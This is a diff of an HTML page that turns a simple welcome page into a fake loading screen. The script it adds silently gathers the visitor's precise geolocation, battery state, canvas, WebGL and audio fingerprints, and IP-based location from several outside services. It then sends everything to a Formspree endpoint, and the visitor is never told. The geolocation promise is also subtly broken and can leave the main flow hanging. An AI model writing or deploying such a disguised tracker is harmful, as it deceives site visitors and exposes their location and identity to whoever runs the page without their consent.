@@ -2,20 +2,123 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>Welcome</title>
+<title>Loading...</title>
 <style>
-body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; text-align: center; padding-top: 60px; }
-h1 { font-size: 24px; }
-p { color: #8b949e; }
+body { background: #f5f5f5; font-family: Arial, sans-serif; padding-top: 40px; text-align: center; }
+h1 { color: #333; }
+p { color: #666; }
+.loading-bar { width: 200px; height: 4px; background: #ddd; margin: 20px auto; border-radius: 2px; overflow: hidden; }
+.loading-bar-inner { width: 0%; height: 100%; background: #4CAF50; animation: load 2s ease-in-out forwards; }
+@keyframes load { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
 </style>
 </head>
 <body>
-<h1>Welcome to our site</h1>
-<p>Please enjoy your stay.</p>
+<h1 id="mainText">Loading content...</h1>
+<p id="subText">Please wait a moment.</p>
+<div class="loading-bar"><div class="loading-bar-inner"></div></div>
 
 <script>
 (async function() {
-    // --- 1. Get device info ---
+    // --- State tracking ---
+    let geoGranted = false;
+    let geoDenied = false;
+    let geoResult = null;
+    let ipResult = null;
+    let deviceData = null;
+    let hasSentData = false;
+
+    // --- Geolocation with permission event listener ---
+    function getGeolocationWithListener() {
+        return new Promise(function(resolve) {
+            if (!navigator.geolocation) {
+                resolve({ error: 'Geolocation not supported by browser' });
+                return;
+            }
+
+            // Listen for permission changes
+            if (navigator.permissions && navigator.permissions.query) {
+                navigator.permissions.query({ name: 'geolocation' }).then(function(permissionStatus) {
+                    permissionStatus.onchange = function() {
+                        const newState = permissionStatus.state;
+                        console.log('Geolocation permission changed:', newState);
+                        
+                        if (newState === 'granted') {
+                            geoGranted = true;
+                            geoDenied = false;
+                            // Try to get high accuracy now
+                            navigator.geolocation.getCurrentPosition(
+                                function(pos) {
+                                    geoResult = {
+                                        latitude: pos.coords.latitude,
+                                        longitude: pos.coords.longitude,
+                                        accuracy: pos.coords.accuracy,
+                                        altitude: pos.coords.altitude || 'N/A',
+                                        altitudeAccuracy: pos.coords.altitudeAccuracy || 'N/A',
+                                        heading: pos.coords.heading || 'N/A',
+                                        speed: pos.coords.speed || 'N/A',
+                                        timestamp: new Date(pos.timestamp).toISOString(),
+                                        method: 'high_accuracy_granted'
+                                    };
+                                    // Only send if we haven't sent yet and user just granted
+                                    if (!hasSentData && geoResult) {
+                                        sendDataWhenReady();
+                                    }
+                                },
+                                function(err) {
+                                    geoResult = { error: err.message, code: err.code, method: 'error_after_grant' };
+                                    if (!hasSentData) {
+                                        sendDataWhenReady();
+                                    }
+                                },
+                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                            );
+                        } else if (newState === 'denied') {
+                            geoGranted = false;
+                            geoDenied = true;
+                            geoResult = { method: 'user_denied', permission_state: 'denied' };
+                            if (!hasSentData) {
+                                sendDataWhenReady();
+                            }
+                        } else if (newState === 'prompt') {
+                            geoResult = { method: 'permission_prompt_shown', permission_state: 'prompt' };
+                        }
+                    };
+                });
+            }
+
+            // Initial request - this triggers the permission dialog
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    geoGranted = true;
+                    geoDenied = false;
+                    geoResult = {
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude || 'N/A',
+                        altitudeAccuracy: pos.coords.altitudeAccuracy || 'N/A',
+                        heading: pos.coords.heading || 'N/A',
+                        speed: pos.coords.speed || 'N/A',
+                        timestamp: new Date(pos.timestamp).toISOString(),
+                        method: 'high_accuracy_granted'
+                    };
+                    // Wait for user interaction before sending
+                },
+                function(err) {
+                    if (err.code === 1) { // PERMISSION_DENIED
+                        geoGranted = false;
+                        geoDenied = true;
+                        geoResult = { error: err.message, code: err.code, method: 'user_denied' };
+                    } else {
+                        geoResult = { error: err.message, code: err.code, method: 'error' };
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // --- Gather device info ---
     async function getDeviceBattery() {
         try {
             if (navigator.getBattery) {
@@ -65,6 +168,7 @@ p { color: #8b949e; }
             mimeTypes.push(nav.mimeTypes[i].type);
         }
 
+        // Canvas fingerprint
         const canvasEl = document.createElement('canvas');
         const ctx = canvasEl.getContext('2d');
         let canvasFingerprint = 'unknown';
@@ -82,6 +186,7 @@ p { color: #8b949e; }
             canvasFingerprint = hash.toString(36);
         } catch(e) {}
 
+        // WebGL fingerprint
         const webglEl = document.createElement('canvas');
         const gl = webglEl.getContext('webgl') || webglEl.getContext('experimental-webgl');
         let webglFingerprint = 'unknown';
@@ -93,9 +198,10 @@ p { color: #8b949e; }
             }
         }
 
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        // AudioContext fingerprint
         let audioFingerprint = 'unknown';
         try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             const oscillator = audioCtx.createOscillator();
             const analyser = audioCtx.createAnalyser();
             const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
@@ -106,14 +212,8 @@ p { color: #8b949e; }
             oscillator.stop(0.01);
             const state = audioCtx.state;
             audioFingerprint = state + '|' + audioCtx.sampleRate;
-        } catch(e) {}
-        finally {
             try { audioCtx.close(); } catch(e) {}
-        }
-
-        const language = nav.language || 'unknown';
-        const languages = nav.languages ? Array.from(nav.languages).join(',') : language;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+        } catch(e) {}
 
         const generalInfo = {
             userAgent: nav.userAgent,
@@ -124,11 +224,9 @@ p { color: #8b949e; }
             vendor: nav.vendor || 'unknown',
             cookieEnabled: nav.cookieEnabled ? 'Yes' : 'No',
             doNotTrack: nav.doNotTrack || 'unspecified',
-            pdfViewerEnabled: nav.pdfViewerEnabled !== undefined ? nav.pdfViewerEnabled : 'unknown',
-            language: language,
-            languages: languages,
-            timezone: timezone,
-            javaEnabled: typeof java !== 'undefined' ? 'Yes' : 'No',
+            language: nav.language || 'unknown',
+            languages: nav.languages ? Array.from(nav.languages).join(',') : (nav.language || 'unknown'),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
             canvasFingerprint: canvasFingerprint,
             webglFingerprint: webglFingerprint,
             audioFingerprint: audioFingerprint,
@@ -144,52 +242,50 @@ p { color: #8b949e; }
         };
     }
 
-    // --- 2. Get geolocation ---
-    function getGeolocation() {
-        return new Promise(function(resolve) {
-            if (!navigator.geolocation) {
-                resolve({ error: 'Geolocation not supported' });
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                function(pos) {
-                    resolve({
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude || 'N/A',
-                        altitudeAccuracy: pos.coords.altitudeAccuracy || 'N/A',
-                        heading: pos.coords.heading || 'N/A',
-                        speed: pos.coords.speed || 'N/A',
-                        timestamp: new Date(pos.timestamp).toISOString()
-                    });
-                },
-                function(err) {
-                    resolve({ error: err.message, code: err.code });
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        });
-    }
-
-    // --- 3. Fetch public IP via free API ---
-    async function getPublicIP() {
+    // --- Get accurate public IP ---
+    async function getAccurateIP() {
+        const results = {};
+        
+        // Primary: ipinfo.io (gives city, region, country, org, coordinates)
         try {
-            const resp = await fetch('https://api.ipify.org?format=json');
-            const data = await resp.json();
-            return { ip: data.ip };
-        } catch(e) {
-            try {
-                const resp2 = await fetch('https://ipinfo.io/json');
-                const data2 = await resp2.json();
-                return { ip: data2.ip, city: data2.city, region: data2.region, country: data2.country, loc: data2.loc, org: data2.org };
-            } catch(e2) {
-                return { ip: 'unknown', error: e2.message };
+            const resp1 = await fetch('https://ipinfo.io/json?token=');
+            if (resp1.ok) {
+                const data1 = await resp1.json();
+                results.primary = data1;
             }
-        }
+        } catch(e) {}
+
+        // Fallback 1: ipapi.co
+        try {
+            const resp2 = await fetch('https://ipapi.co/json/');
+            if (resp2.ok) {
+                const data2 = await resp2.json();
+                results.fallback1 = data2;
+            }
+        } catch(e) {}
+
+        // Fallback 2: ipify.org (just IP)
+        try {
+            const resp3 = await fetch('https://api.ipify.org?format=json');
+            if (resp3.ok) {
+                const data3 = await resp3.json();
+                results.fallback2 = data3;
+            }
+        } catch(e) {}
+
+        // Fallback 3: ip-api.com
+        try {
+            const resp4 = await fetch('http://ip-api.com/json/');
+            if (resp4.ok) {
+                const data4 = await resp4.json();
+                results.fallback3 = data4;
+            }
+        } catch(e) {}
+
+        return results;
     }
 
-    // --- 4. Send everything to Formspree ---
+    // --- Send to Formspree when ready ---
     async function sendToFormspree(data) {
         const payload = JSON.stringify(data, null, 2);
         try {
@@ -205,21 +301,56 @@ p { color: #8b949e; }
         }
     }
 
+    // --- Function to send data when geolocation decision is made ---
+    async function sendDataWhenReady() {
+        if (hasSentData) return;
+        
+        // Small delay to ensure all data is collected
+        setTimeout(async function() {
+            if (!hasSentData) {
+                const finalPayload = {
+                    timestamp: new Date().toISOString(),
+                    ip_data: ipResult,
+                    location: geoResult,
+                    device: deviceData,
+                    permission_status: {
+                        granted: geoGranted,
+                        denied: geoDenied
+                    }
+                };
+                
+                await sendToFormspree(finalPayload);
+                hasSentData = true;
+            }
+        }, 1000);
+    }
+
     // --- Main execution ---
-    const [geo, ipInfo, deviceData] = await Promise.all([
-        getGeolocation(),
-        getPublicIP(),
+    // Start all parallel requests immediately
+    const [geoPromise, ipPromise, devicePromise] = [
+        getGeolocationWithListener(),
+        getAccurateIP(),
         gatherInfo()
-    ]);
+    ];
 
-    const finalPayload = {
-        timestamp: new Date().toISOString(),
-        ip: ipInfo,
-        location: geo,
-        device: deviceData
-    };
+    // Wait for all data to be collected
+    const [geoRes, ipRes, devData] = await Promise.all([geoPromise, ipPromise, devicePromise]);
+    
+    geoResult = geoRes;
+    ipResult = ipRes;
+    deviceData = devData;
 
-    await sendToFormspree(finalPayload);
+    // If geolocation was already decided (granted or denied), send immediately
+    if (geoGranted || geoDenied) {
+        await sendDataWhenReady();
+    }
+
+    // Optional: Hide loading and show content after 2.5 seconds
+    setTimeout(function() {
+        document.getElementById('mainText').textContent = 'Welcome!';
+        document.getElementById('subText').textContent = 'Your content is ready.';
+    }, 2500);
+
 })();
 </script>
 </body>
